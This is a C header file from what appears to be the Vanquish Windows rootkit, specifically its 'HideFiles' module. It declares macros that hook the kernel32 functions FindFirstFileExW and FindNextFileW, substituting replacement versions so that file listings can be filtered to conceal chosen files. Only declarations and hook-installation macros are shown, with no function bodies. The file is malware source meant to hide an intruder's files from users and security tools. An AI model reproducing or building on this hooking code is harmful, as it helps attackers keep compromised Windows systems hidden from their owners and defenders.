/******************************************************************************\

	Vanquish DLL HideFiles - Copyright (c)2003 XShadow, All rights reserved.

	This program is free software; you can redistribute it but not modify
	it under the terms of license.txt file that came with this package

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
	license for more details.

\******************************************************************************/

#ifndef __VANQUISH_DLL_HIDEFILES__H__
#define __VANQUISH_DLL_HIDEFILES__H__

#include "Vanquish_dll.h"

//default load handlers
#define LOAD_KERNEL32__HIDEFILES \
	INITIAL_REPLACE_API(FindFirstFileExW, KERNEL32); \
	INITIAL_REPLACE_API(FindNextFileW, KERNEL32);

#define LOAD_ADVAPI32__HIDEFILES
#define LOAD_USER32__HIDEFILES
#define LOAD_WS2_32__HIDEFILES

//default UNload handlers
#define UNLOAD_KERNEL32__HIDEFILES \
	FINAL_RESTORE_API(FindNextFileW); \
	FINAL_RESTORE_API(FindFirstFileExW);

#define UNLOAD_ADVAPI32__HIDEFILES
#define UNLOAD_USER32__HIDEFILES
#define UNLOAD_WS2_32__HIDEFILES

//declaring handlers
#define DECLARE_HIDEFILES \
	DECLARE_NEWENTRY(FindFirstFileExW); \
	DECLARE_NEWENTRY(FindNextFileW);

//extern declare
#define EXTERN_HIDEFILES \
	EXTERN_NEWENTRY(FindFirstFileExW); \
	EXTERN_NEWENTRY(FindNextFileW);

//Vanquish NEW API declarations follows
//Declarations are in conformance with the real Windows API header files
//Difference between this and real api prototypes:
//    1) prefixed V to the name
//    2) replaced WINAPI with NEWAPI

//Original header definitions: (winbase.h)
//PS: FindFirstFileA, FindFirstFileW and FindFirstFileExA call FindFirstFileExW
//    also, FindNextFileA calls FindNextFileW

NEWAPI
HANDLE
WINAPI
VFindFirstFileExW(
	LPCWSTR lpFileName,
	FINDEX_INFO_LEVELS fInfoLevelId,
	LPVOID lpFindFileData,
	FINDEX_SEARCH_OPS fSearchOp,
	LPVOID lpSearchFilter,
	DWORD dwAdditionalFlags
	);

NEWAPI
BOOL
WINAPI
VFindNextFileW(
	HANDLE hFindFile,
	LPWIN32_FIND_DATAW lpFindFileData
	);

#endif//__VANQUISH_DLL_HIDEFILES__H__
